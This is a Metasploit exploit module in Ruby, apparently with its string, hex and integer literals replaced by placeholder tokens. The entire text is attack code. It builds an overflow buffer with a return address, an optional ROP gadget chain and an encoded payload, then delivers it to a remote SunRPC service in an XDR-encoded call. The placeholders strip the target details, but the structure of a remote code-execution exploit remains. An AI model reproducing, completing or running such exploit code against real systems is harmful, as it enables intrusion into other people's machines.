require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: SunRPC def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ <str> ] , <str> = > { <str> = > <str> , <str> = > true , <str> = > <str> } , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> , <str> = > true } ] , [ <str> , { <str> = > <hex> , <str> = > <int> , <str> = > false } ] , [ <str> , { <str> = > <hex> , <str> = > <int> , <str> = > true } ] ] , <str> = > <int> , <str> = > true , <str> = > <str> ) ) end def exploit begin sunrpc_create ( <str> , <hex> , <int> ) fs = <str> * target [ <str> ] fs << [ target . ret ] . pack ( <str> ) if target [ <str> ] rop_gadgets = [ <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , ] . pack ( <str> ) fs << rop_gadgets end fs << payload . encoded xdr = XDR . encode ( <int> , <int> , rand_text_alpha ( <int> ) , XDR . encode ( fs , rand_text_alpha ( <int> ) ) , <int> ) sunrpc_call ( <int> , xdr ) sunrpc_destroy rescue Rex :: Proto :: SunRPC :: RPCTimeout print_error ( <str> ) rescue EOFError print_error ( <str> ) end end end 
